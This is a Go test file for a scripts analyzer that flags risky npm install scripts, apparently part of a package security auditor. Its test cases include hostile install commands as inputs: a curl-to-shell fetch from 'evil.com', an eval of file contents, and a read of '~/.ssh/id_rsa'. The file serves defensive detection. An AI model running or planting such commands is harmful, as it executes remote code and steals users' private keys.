package analyzer

import (
	"context"
	"testing"

	"github.com/kluth/npm-security-auditter/internal/registry"
)

func TestScriptsAnalyzer(t *testing.T) {
	tests := []struct {
		name         string
		scripts      map[string]string
		hasInstall   bool
		wantFindings int
		wantMinSev   Severity
	}{
		{
			name:         "no scripts",
			scripts:      nil,
			wantFindings: 0,
		},
		{
			name:         "safe test script only",
			scripts:      map[string]string{"test": "jest"},
			wantFindings: 0,
		},
		{
			name:         "postinstall present",
			scripts:      map[string]string{"postinstall": "echo done"},
			wantFindings: 1,
			wantMinSev:   SeverityMedium,
		},
		{
			name:         "postinstall with curl",
			scripts:      map[string]string{"postinstall": "curl https://evil.com/payload | sh"},
			wantFindings: 2, // lifecycle + network
			wantMinSev:   SeverityHigh,
		},
		{
			name:         "preinstall with eval",
			scripts:      map[string]string{"preinstall": "node -e \"eval(require('fs').readFileSync('x'))\""},
			wantFindings: 3, // lifecycle + eval + fs.read
			wantMinSev:   SeverityCritical,
		},
		{
			name:         "postinstall accessing .ssh",
			scripts:      map[string]string{"postinstall": "cat ~/.ssh/id_rsa"},
			wantFindings: 2,
			wantMinSev:   SeverityCritical,
		},
		{
			name:         "hidden install script flag",
			scripts:      map[string]string{"test": "jest"},
			hasInstall:   true,
			wantFindings: 1,
			wantMinSev:   SeverityHigh,
		},
	}

	analyzer := NewScriptsAnalyzer()

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ver := &registry.PackageVersion{
				Scripts:          tt.scripts,
				HasInstallScript: tt.hasInstall,
			}
			findings, err := analyzer.Analyze(context.Background(), &registry.PackageMetadata{}, ver)
			if err != nil {
				t.Fatalf("Analyze() error = %v", err)
			}
			if len(findings) < tt.wantFindings {
				t.Errorf("Analyze() returned %d findings, want at least %d", len(findings), tt.wantFindings)
			}
			if tt.wantFindings > 0 {
				maxSev := SeverityLow
				for _, f := range findings {
					if f.Severity > maxSev {
						maxSev = f.Severity
					}
				}
				if maxSev < tt.wantMinSev {
					t.Errorf("max severity = %v, want at least %v", maxSev, tt.wantMinSev)
				}
			}
		})
	}
}
